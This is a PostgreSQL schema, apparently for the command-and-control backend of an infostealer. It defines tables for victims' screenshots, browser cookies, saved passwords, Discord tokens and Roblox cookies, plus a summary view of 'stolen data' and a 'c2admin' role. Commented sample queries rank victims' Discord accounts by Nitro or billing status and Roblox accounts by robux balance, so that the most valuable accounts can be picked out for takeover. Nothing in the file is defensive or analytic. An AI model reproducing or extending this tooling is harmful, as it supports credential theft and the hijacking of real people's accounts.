-- Enhanced C2 Database Schema - Stolen Data & Screenshots
-- Run this on your PostgreSQL database

-- Screenshots table
CREATE TABLE IF NOT EXISTS screenshots (
    id SERIAL PRIMARY KEY,
    victim_id VARCHAR(255) NOT NULL,
    filename VARCHAR(500) NOT NULL,
    file_path TEXT NOT NULL,
    size BIGINT NOT NULL,
    width INT,
    height INT,
    format VARCHAR(10) DEFAULT 'jpeg',
    taken_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (victim_id) REFERENCES victims(id) ON DELETE CASCADE
);

CREATE INDEX idx_screenshots_victim ON screenshots(victim_id);
CREATE INDEX idx_screenshots_taken_at ON screenshots(taken_at DESC);

-- Browser cookies table
CREATE TABLE IF NOT EXISTS browser_cookies (
    id SERIAL PRIMARY KEY,
    victim_id VARCHAR(255) NOT NULL,
    browser VARCHAR(50) NOT NULL,
    host VARCHAR(500) NOT NULL,
    name VARCHAR(500) NOT NULL,
    value TEXT NOT NULL,
    path VARCHAR(500),
    expires_at TIMESTAMP,
    is_secure BOOLEAN DEFAULT FALSE,
    is_http_only BOOLEAN DEFAULT FALSE,
    same_site VARCHAR(20),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (victim_id) REFERENCES victims(id) ON DELETE CASCADE
);

CREATE INDEX idx_cookies_victim ON browser_cookies(victim_id);
CREATE INDEX idx_cookies_host ON browser_cookies(host);
CREATE INDEX idx_cookies_browser ON browser_cookies(browser);

-- Browser passwords table
CREATE TABLE IF NOT EXISTS browser_passwords (
    id SERIAL PRIMARY KEY,
    victim_id VARCHAR(255) NOT NULL,
    browser VARCHAR(50) NOT NULL,
    url TEXT NOT NULL,
    username VARCHAR(500),
    password TEXT NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (victim_id) REFERENCES victims(id) ON DELETE CASCADE
);

CREATE INDEX idx_passwords_victim ON browser_passwords(victim_id);
CREATE INDEX idx_passwords_browser ON browser_passwords(browser);

-- Discord tokens table
CREATE TABLE IF NOT EXISTS discord_tokens (
    id SERIAL PRIMARY KEY,
    victim_id VARCHAR(255) NOT NULL,
    token TEXT NOT NULL UNIQUE,
    email VARCHAR(500),
    username VARCHAR(500),
    phone VARCHAR(50),
    mfa BOOLEAN DEFAULT FALSE,
    verified BOOLEAN DEFAULT FALSE,
    nitro VARCHAR(20) DEFAULT 'None',
    billing BOOLEAN DEFAULT FALSE,
    source VARCHAR(100),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (victim_id) REFERENCES victims(id) ON DELETE CASCADE
);

CREATE INDEX idx_discord_victim ON discord_tokens(victim_id);
CREATE INDEX idx_discord_nitro ON discord_tokens(nitro);
CREATE INDEX idx_discord_billing ON discord_tokens(billing);

-- Roblox cookies table
CREATE TABLE IF NOT EXISTS roblox_cookies (
    id SERIAL PRIMARY KEY,
    victim_id VARCHAR(255) NOT NULL,
    cookie TEXT NOT NULL UNIQUE,
    username VARCHAR(500),
    user_id VARCHAR(100),
    robux INT DEFAULT 0,
    premium BOOLEAN DEFAULT FALSE,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (victim_id) REFERENCES victims(id) ON DELETE CASCADE
);

CREATE INDEX idx_roblox_victim ON roblox_cookies(victim_id);
CREATE INDEX idx_roblox_robux ON roblox_cookies(robux DESC);

-- Create view for stolen data summary
CREATE OR REPLACE VIEW stolen_data_summary AS
SELECT 
    v.id AS victim_id,
    v.hostname,
    COUNT(DISTINCT bc.id) AS cookies_count,
    COUNT(DISTINCT bp.id) AS passwords_count,
    COUNT(DISTINCT dt.id) AS discord_tokens,
    COUNT(DISTINCT rc.id) AS roblox_cookies,
    COUNT(DISTINCT s.id) AS screenshots_count,
    MAX(v.last_seen) AS last_activity
FROM victims v
LEFT JOIN browser_cookies bc ON v.id = bc.victim_id
LEFT JOIN browser_passwords bp ON v.id = bp.victim_id
LEFT JOIN discord_tokens dt ON v.id = dt.victim_id
LEFT JOIN roblox_cookies rc ON v.id = rc.victim_id
LEFT JOIN screenshots s ON v.id = s.victim_id
GROUP BY v.id, v.hostname;

-- Grant permissions (adjust username as needed)
GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO c2admin;
GRANT USAGE, SELECT ON ALL SEQUENCES IN SCHEMA public TO c2admin;

-- Sample queries for monitoring

-- Get high-value Discord accounts (Nitro or billing info)
-- SELECT * FROM discord_tokens WHERE nitro != 'None' OR billing = TRUE;

-- Get Roblox accounts with robux
-- SELECT * FROM roblox_cookies WHERE robux > 0 ORDER BY robux DESC;

-- Get recent screenshots
-- SELECT * FROM screenshots ORDER BY taken_at DESC LIMIT 20;

-- Get victim summary with stolen data counts
-- SELECT * FROM stolen_data_summary ORDER BY last_activity DESC;

-- Get all cookies for a specific domain
-- SELECT * FROM browser_cookies WHERE host LIKE '%example.com%';
